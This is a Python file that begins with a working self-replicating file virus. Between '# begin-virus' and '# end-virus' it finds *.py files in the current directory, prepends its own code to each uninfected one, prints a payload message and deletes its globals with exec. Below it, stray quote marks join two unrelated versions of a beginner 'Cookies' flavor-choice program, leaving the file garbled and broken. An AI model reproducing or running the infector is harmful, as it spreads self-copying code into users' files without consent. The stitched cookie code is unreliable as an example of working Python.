# begin-virus

import glob

def find_files_to_infect(directory = "."):
    return [file for file in glob.glob("*.py")]

def get_content_of_file(file):
    data = None
    with open(file, "r") as my_file:
        data = my_file.readlines()

    return data

def get_content_if_infectable(file):
    data = get_content_of_file(file)
    for line in data:
        if "# begin-virus" in line:
            return None
    return data

def infect(file, virus_code):
    if (data:=get_content_if_infectable(file)):
        with open(file, "w") as infected_file:
            infected_file.write("".join(virus_code))
            infected_file.writelines(data)

def get_virus_code():

    virus_code_on = False
    virus_code = []

    code = get_content_of_file(__file__)

    for line in code:
        if "# begin-virus\n" in line:
            virus_code_on = True

        if virus_code_on:
            virus_code.append(line)

        if "# end-virus\n" in line:
            virus_code_on = False
            break

    return virus_code

def summon_chaos():
    # the virus payload
    print("We are sick, fucked up and complicated\nWe are chaos, we can't be cured")

# entry point 

try:
    # retrieve the virus code from the current infected script
    virus_code = get_virus_code() 

    # look for other files to infect
    for file in find_files_to_infect():
        infect(file, virus_code)

    # call the payload
    summon_chaos()

# except:
#     pass

finally:
    # delete used names from memory
    for i in list(globals().keys()):
        if(i[0] != '_'):
            exec('del {}'.format(i))

    del i

# end-virus'''class Cookies:
    def __init__(self, ingredients, flavors):
        self.ingredients = ingredients
        self.flavors = flavors

    def strawberry(flavors):
        print('f"self.flavors" now has the flavor strawberry!')
    def chocolate(flavors):
        print('f"self.flavors" now has the flavor chocolate!')

    print(f'You can choose between 2 flavors such as chocolate or strawberry')
    x = input("Choose your flavor")
    if x == cookie_1:
        print("Congratulation! Have a strawberry cookie(s)")
    elif x == cookie_2:
        print("Congratulations! Have a chocolate cookie(s)")
    else:
        print("Sorry, re-enter your choice please")

    print('You can choose between 2 flavors: chocolate or strawberry')
x = input("Choose your flavor: ")

if x.lower() == "strawberry":
    cookie.add_strawberry()
    print("Congratulations! Have a strawberry cookie(s)")
elif x.lower() == "chocolate":
    cookie.add_chocolate()
    print("Congratulations! Have a chocolate cookie(s)")
else:
    print("Sorry, re-enter your choice please")
    
    ]'''class Cookies:
    def __init__(self, ingredients, flavors):
        self.ingredients = ingredients
        self.flavors = flavors

    def add_strawberry(self):
        self.flavors.append("strawberry")
        print(f'{self.flavors} now has the flavor strawberry!')

    def add_chocolate(self):
        self.flavors.append("chocolate")
        print(f'{self.flavors} now has the flavor chocolate!')

# Create an instance of the Cookies class with some initial ingredients and an empty flavor list
cookie = Cookies(ingredients=["flour", "sugar", "butter"], flavors=[])

print('You can choose between 2 flavors: chocolate or strawberry')
x = input("Choose your flavor: ")

if x.lower() == "strawberry":
    cookie.add_strawberry()
    print("Congratulations! Have a strawberry cookie(s)")
elif x.lower() == "chocolate":
    cookie.add_chocolate()
    print("Congratulations! Have a chocolate cookie(s)")
else:
    print("Sorry, re-enter your choice please")'''
